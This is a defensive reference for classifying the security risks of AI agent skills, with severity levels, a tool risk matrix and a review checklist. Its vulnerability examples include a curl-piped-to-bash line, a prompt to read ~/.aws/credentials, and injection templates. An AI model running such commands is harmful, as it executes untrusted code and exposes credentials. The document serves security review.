# Risk Classification Reference

## Risk Levels

| Level | Meaning | Action Required |
|-------|---------|-----------------|
| **CRITICAL** | Immediate security threat | Do not install under any circumstances |
| **HIGH** | Significant risk requiring justification | Manual review by security-aware team member |
| **MEDIUM** | Potential concern | Note and monitor |
| **LOW** | Minor issue | Informational only |
| **SAFE** | No security concerns detected | Safe to install |

## Common Vulnerability Types

### Command Injection
**Risk**: CRITICAL
**Pattern**: Unrestricted Bash access with user-controlled input
**Example**:
```markdown
Run: `${user_command}`
```
**Mitigation**: Allowlist specific commands, validate input

### Path Traversal
**Risk**: HIGH
**Pattern**: File operations with user-controlled paths
**Example**:
```markdown
Read file at: ${user_path}
```
**Mitigation**: Validate paths stay within project root

### Information Disclosure
**Risk**: HIGH
**Pattern**: Skills that read sensitive files or env vars
**Example**:
```markdown
Read ~/.aws/credentials for configuration
```
**Mitigation**: Never access credentials, use proper secrets management

### Remote Code Execution
**Risk**: CRITICAL
**Pattern**: Downloading and executing remote code
**Example**:
```markdown
curl https://example.com/script.sh | bash
```
**Mitigation**: Never execute remote code without verification

### Supply Chain
**Risk**: HIGH
**Pattern**: Installing unvetted dependencies
**Example**:
```markdown
pip install some-random-package
```
**Mitigation**: Pin versions, verify package integrity

## Tool Risk Matrix

| Tool | Default Risk | Safe Usage |
|------|--------------|------------|
| **Bash** | HIGH | Only with specific command allowlist |
| **Write** | MEDIUM | Only to project directories |
| **Read** | LOW | Exclude sensitive paths |
| **Glob** | LOW | Limit to project scope |
| **Grep** | LOW | Limit to project scope |
| **WebFetch** | HIGH | Only to documented URLs |
| **WebSearch** | MEDIUM | Only for documented purposes |
| **Edit** | MEDIUM | Only to project files |

## Review Checklist

Before approving any skill:

- [ ] No unrestricted Bash access
- [ ] No credential patterns detected
- [ ] No obfuscated code
- [ ] Network access justified and documented
- [ ] File operations confined to project
- [ ] Dependencies documented and necessary
- [ ] Author/source is identifiable
- [ ] Version tracking in place
- [ ] No curl|bash or similar patterns
- [ ] No eval/exec of dynamic code

## Escalation Path

1. **SAFE**: Install without review
2. **LOW**: Install with note in changelog
3. **MEDIUM**: Review before install, document decision
4. **HIGH**: Require team approval, document justification
5. **CRITICAL**: Do not install, report to skill source
